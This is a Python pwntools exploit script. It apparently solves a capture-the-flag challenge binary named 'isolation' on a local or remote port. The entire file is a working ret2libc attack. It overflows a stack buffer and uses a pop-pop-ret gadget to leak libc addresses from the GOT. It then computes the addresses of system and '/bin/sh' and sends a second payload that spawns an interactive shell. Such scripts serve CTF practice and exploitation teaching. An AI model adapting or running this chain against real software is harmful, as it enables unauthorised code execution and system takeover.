from pwn import *

log.info("Iniciando el hackeo.")

remoteflag = 1
IP = 'localhost'    # change this
PORT = 7889         # change this
FILENAME = "./isolation"
if remoteflag:
    io = remote(IP, PORT)
else:
    io = process(FILENAME)

elf = context.binary = ELF(FILENAME)

if not remoteflag:
    gdb.attach(io)

payload = ''

name = flat("JUNK", "J2NK", elf.sym.puts, elf.sym.main, elf.got.printf)
io.sendline(name)
log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

for _ in range(9): # skip to the end of the stack frame
    io.sendline("lol")
    log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

io.sendline("A")
io.sendline("JJJJJJJJJJJJJJJJJJJJJJJJ") #room
#io.sendline("jjjjjjjjjjjjjjjjjjjjjjjj") #activity
#io.sendline(cyclic(10)) # offset: 3
#io.sendline("ABC"+pack(elf.sym.main)) # this works, you will end up returning to main

#putsleak = flat(elf.sym.puts, elf.sym.main, elf.got.printf)
#io.sendline("ABC"+putsleak)
# ^this doesn't work out of the box, you first need a gadget that will
# skip two words of junk
# And put the putsleak payload in your name (+ 2 words of padding at the start)
pop_2w = pack(0x08048596) #: pop ebx ; pop ebp ; ret
io.sendline(b"ABC"+pop_2w)
log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

#log.info(io.recvrepeat(1))
#io.sendline("Q")
# Q does not flush, if we have a newline at the end, our name will be 
# '\n' when we return to main
io.send("Q") # no newline
printf_leak = unpack(io.recvn(4))
log.hexdump(printf_leak)
getchar_leak = io.recvn(4)
log.hexdump(getchar_leak)
fgets_leak = io.recvn(4)
log.hexdump(fgets_leak)
# this should be more than enough to work out the libc version

#libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')
base = printf_leak - libc.sym.printf

sys = base + libc.sym.system
binsh = base + next(libc.search(b'/bin/sh\x00'))

log.info("calculated sys addr")
log.hexdump(sys)

# main(), round 2

name = flat("J3NK", "J4NK", sys, "LMAO", binsh)
# the rest is the same as before
io.sendline(name)
log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

for _ in range(9): # skip to the end of the stack frame
    io.sendline("lol")
    log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

io.sendline("A")
io.sendline("JJJJJJJJJJJJJJJJJJJJJJJJ")

pop_2w = pack(0x08048596) #: pop ebx ; pop ebp ; ret
io.sendline(b"ABC"+pop_2w)
log.info(io.recvuntil("Enter your choice, (or press enter to refresh): "))

io.send("Q") # no newline


io.interactive()
